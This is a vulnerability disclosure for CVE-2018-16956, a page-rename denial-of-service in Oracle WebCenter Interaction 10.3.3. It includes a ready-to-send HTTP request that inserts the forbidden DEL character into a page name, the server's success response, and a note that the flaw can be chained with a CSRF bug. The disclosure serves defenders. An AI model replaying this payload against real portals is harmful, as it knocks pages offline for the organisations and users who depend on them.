# Oracle WebCenter Interaction - Page Edit DoS

**CVE:** CVE-2018-16956

**CVSSv3:** 4.3 - CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L

**Versions affected:** 10.3.3

## Introduction

Oracle WebCenter Interaction, formerly called BEA AquaLogic User Interaction and now part of Oracle WebCenter Suite, is an integrated, comprehensive collection of components used to create enterprise portals, collaborative communities, and composite and social applications.

## Background

The Oracle WebCenter Interaction (WCI) portal provides the primary user interface to the suite of products included in WCI. The portal can be deployed as an ASP.NET application for IIS when installed on Windows Server.

## Vulnerability

The `AjaxControl` component, responsible for renaming pages throughout the portal, does not validate the name of a given page for characters unsupported by the web server. It is therefore possible for a page to be renamed to include characters that are forbidden in a URI by the web server.

When a portal page is renamed in such a fashion, the page can no longer be accessed by its URI in the portal.

Most noteably, the DELETE character `0x7f` is not supported by IIS 7.5+ in the URL path. However, this character can be inserted into the name of a personal or community page when renaming the page.

The following request renames the landing page for a portal community to include the forbidden DELETE character.

```http
POST /portal/server.pt? HTTP/1.1
Host: <HOST>
Content-Length: 86
Origin: http://<HOST>
PT-HTTPRequest-Type: CLIENT_SIDE
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: ptrecentfolders=201-200-8-; ptLastLoginAuthSource=; ptLTCN=ptLTCDV; ASP.NET_SessionId=jwkg4u55l4yz2z45vqews434; plloginoccured=true
Connection: close

in_hi_space=Ajax&in_hi_control=AjaxControl&action=rename&cid=518&oid=100&name=asd%7faa
```

The response returned from the web application indicates the page was renamed successfully.

```
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 459
Content-Type: text/html; charset=utf-8
Content-Language: en
Expires: 1529819143601
Last-Modified: 1529905543601
Server: Microsoft-IIS/7.5
X-AspNet-Version: 2.0.50727
X-Powered-By: ASP.NET
Connection: close

{oldname:'New Page', newname:'NewPage', classid:'514', objectid:'211', status:'1', message:'Successfully renamed Page \'New Page\' to \'NewPage\'', refreshURL:'http://<HOST>/portal/server.pt/community/information_center/200/new%7Fpage/211'}<!--Hostname: WCISRV--><!--Total Request Time: 93
Control Time: 62
Page Construction Time: 31
Page Display Time: 0
--><!--Portal Version: 10.3.3.379633, Changelist: 379633, Build Date: 08/12/2011 at 10:30 AM-->
```

However, when the web server attempts to access this page (including after the user logs into the portal), IIS rejects the request with a HTTP 400 as the inserted DELETE character is forbidden in the URL (as shown in Figure 1 below).

![page dos](images/08-page-dos-result.jpg)

An attacker can exploit this vulnerability to prevent pages from being accessed within the portal. Authenticated attackers with the ability to rename pages can include the `0x7f` character and prevent them from being accessed. Further, an unauthetnicated attacker can exploit the lack of CSRF protections (CVE-2018-16952) to rename pages and communities with the intention of breaking as many pages as possible.

When the landing page for portal users is renamed in this fashion, non-techncial users will no longer be able to access the portal once they login. The redirection to the landing page URL containing the forbidden character will no longer succeed. This could cause sustained outages for Oracle customers as the resolution would require database restoration or adminsitrative editing of the page name.

## Versions Affected

This vulnerability affects version 10.3.3 of the Oracle WebCenter Interaction portal - specifically build 10.3.3.379633 (the latest version at the time of writing).

## References

https://github.com/xdrr/vulnerability-research/tree/master/webapp/oracle/webcenter/interaction/2018-06-multiple

## Credit

This vulnerability was discovered by Ben N (pajexali@gmail.com) 26 June 2018.

---
mainfont: Roboto
monofont: Source Code Pro
header-includes:
    - \lstset{breaklines=true}
    - \lstset{language=[Motorola68k]Assembler}
    - \lstset{basicstyle=\small\ttfamily}
    - \lstset{extendedchars=true}
    - \lstset{tabsize=2}
    - \lstset{columns=fixed}
    - \lstset{showstringspaces=false}
    - \lstset{frame=trbl}
    - \lstset{frameround=tttt}
    - \lstset{framesep=4pt}
    - \lstset{numbers=left}
    - \lstset{numberstyle=\tiny\ttfamily}
    - \lstset{postbreak=\raisebox{0ex}[0ex][0ex]{\ensuremath{\color{red}\hookrightarrow\space}}}
...